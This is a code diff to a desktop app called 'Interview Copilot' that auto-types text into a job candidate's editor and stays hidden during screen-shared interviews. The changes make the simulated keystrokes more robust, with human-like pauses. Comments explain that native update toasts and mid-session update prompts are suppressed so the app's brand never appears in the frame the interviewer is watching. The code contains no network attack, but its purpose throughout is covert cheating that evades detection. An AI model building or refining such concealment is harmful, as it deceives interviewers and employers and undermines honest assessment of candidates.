@@ -5876,11 +6917,17 @@ async function executeMultiOpPlan(operations, ctx) {
     }
     if (op.op === 'replace' && uiaLines && uiaLines.length === 1 && s === 1 && !browserHosted) {
       console.log(`[auto-type] multi-op ${done + 1}/${ops.length}: replace L1-${e} via Ctrl+A (flat-UIA whole-doc path, ${uiaLines[0].length} chars in single logical line, native editor "${processName || '?'}") — ${op.reason || ''}`);
-      await keyboard.pressKey(Key.LeftControl);
-      await autoTypeNavSleep(5, 14);
-      await autoTypePressWithDwell(keyboard, Key.A);
-      await autoTypeNavSleep(5, 14);
-      await keyboard.releaseKey(Key.LeftControl);
+      // The Delete two statements below is why this hold in particular
+      // cannot be left bare. If the "A" press throws, Ctrl is released in
+      // withHeldKey's finally AND the throw carries execution straight out
+      // of this block — so Delete is never reached at all, let alone
+      // reached as Ctrl+Delete, which in the candidate's live editor is
+      // delete-word-forward against a document we did not select.
+      await withHeldKey(keyboard, Key.LeftControl, async () => {
+        await autoTypeNavSleep(5, 14);
+        await autoTypePressWithDwell(keyboard, Key.A);
+        await autoTypeNavSleep(5, 14);
+      });
       await autoTypeNavSleep(40, 80);
       // Glance pause before deleting selection — humans look at what
       // they highlighted before nuking it.
@@ -7400,6 +8447,19 @@ app.whenReady().then(() => {
         showBootWindow();
       });
 
+      // ── Why every check below is checkForUpdates, never ...AndNotify ──
+      // checkForUpdatesAndNotify chains a `new Notification(...).show()`
+      // onto the download promise (electron-updater AppUpdater.js:286-300),
+      // with the default body "A new update is ready to install". Since
+      // autoDownload is true, ANY check that finds a new version downloads
+      // it and then pops a native Windows toast titled "Interview Copilot".
+      // A native toast is a separate HWND — setContentProtection does not
+      // touch it — so on a screen-shared interview it lands in the frame the
+      // interviewer is watching, with our brand on it. The app already has
+      // its own in-app "Restart & Update" prompt driven by sendUpdateStatus,
+      // which is the whole point of the launch-check comment below; these
+      // paths just needed to say the same thing.
+
       // User clicks "Restart & Update" in Settings — show the installer
       // UI (non-silent) so they get visual feedback during the swap. If
       // no download is ready yet, kick a check; the renderer prompt will
@@ -7408,14 +8468,14 @@ app.whenReady().then(() => {
         if (pendingUpdate) {
           performInstall(false);
         } else {
-          autoUpdater.checkForUpdatesAndNotify().catch((e) => {
+          autoUpdater.checkForUpdates().catch((e) => {
             electronLog.error('[updater] install-update check failed:', e && e.message);
           });
         }
       });
 
       ipcMain.on('check-for-updates', () => {
-        autoUpdater.checkForUpdatesAndNotify().catch((e) => {
+        autoUpdater.checkForUpdates().catch((e) => {
           electronLog.error('[updater] manual check failed:', e && e.message);
         });
       });
@@ -7429,8 +8489,18 @@ app.whenReady().then(() => {
 
       // Periodic re-check for long-running sessions (tray apps stay alive
       // for days — they need to discover updates without a relaunch).
+      //
+      // Never while a session is live. Even with the native toast gone, a
+      // tick that lands 40 minutes into a screen-shared interview downloads
+      // a full NSIS installer in the background (disableDifferentialDownload
+      // is on) and fires update-status at the renderer, which is enough to
+      // put an update prompt on screen at the worst possible moment. The
+      // user is not going to restart mid-interview anyway. Skipping costs
+      // us one 30-minute tick; the next one picks it up. Same sessionActive
+      // gate every other notification path in this file uses.
       setInterval(() => {
-        autoUpdater.checkForUpdatesAndNotify().catch(() => {});
+        if (sessionActive) return;
+        autoUpdater.checkForUpdates().catch(() => {});
       }, 30 * 60 * 1000);
     } catch (err) {
       console.error('[updater] unavailable:', err && err.message);
